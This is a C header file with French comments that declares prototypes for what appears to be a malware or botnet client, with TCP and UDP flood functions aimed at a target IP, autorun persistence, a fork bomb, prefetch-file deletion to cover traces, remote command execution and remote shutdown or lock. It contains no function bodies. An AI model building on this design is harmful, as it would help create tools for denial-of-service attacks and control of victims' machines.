#ifndef PROTO_H
#define PROTO_H

// Déclaration des prototypes des fonctions

int AutoRun();
//int dateconvert( FILETIME * valeur);
int ddostcp(int port, char * addrip, int nbpackets, int sizepacket, int delai );
int ddosudp(int port, char * addrip, int nbpackets, int sizepacket, int delai );
void supfichier(char* filename);
void deletePrefetchFiles(void);
//int enumfiles( char * dir, char * nameext );
void forkbomb();
void ftexec(char* command);
int hardcollec();
void image(char * filename);
void lock();
void logoff();
void randomize();
void restart();
void shutdownfunc();
void song(char * filename);

#endif
